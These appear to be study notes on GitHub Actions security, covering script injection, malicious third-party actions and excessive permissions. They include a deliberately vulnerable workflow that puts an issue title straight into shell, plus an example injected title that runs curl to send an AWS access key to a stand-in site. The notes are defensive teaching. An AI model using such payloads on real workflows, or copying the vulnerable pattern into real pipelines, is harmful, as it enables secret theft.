## Security
The security concerns in github actions is an issue that needs to be 
1. Script Injections - workflow/value injects an issue into your workflow.
- Writing scripts directly in the shell may at times lead to string injections. Therefore it is advisabvle to used environment variables and pass them to the shell commannds instead of using the directly in the file. 
    ```
    jobs:
    assign-label:
        runs-on: ubuntu-latest
        steps:
        - name: Assign label
            run: |
            issue_title="${{ github.event.issue.title }}"
            if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            else
            echo "Issue is not about a bug"
            fi
    ```
    Code above may be Susceptible to injection of malicioes code such as; 
    - `"a;curl http://my-bad-site.com?abc=$AWS_ACCESS_KEY_ID" sends the value of the access key to the website.
    - `"a;echo Got your secrets" test on a sample scipt injection.

2. Maliucious 3rd party - actions added to workflows may contain codes that steal your secrets or inspect the code of untrusted authors.
3. permission issues - cosidering overly permissive conditions such as read only to edit the code.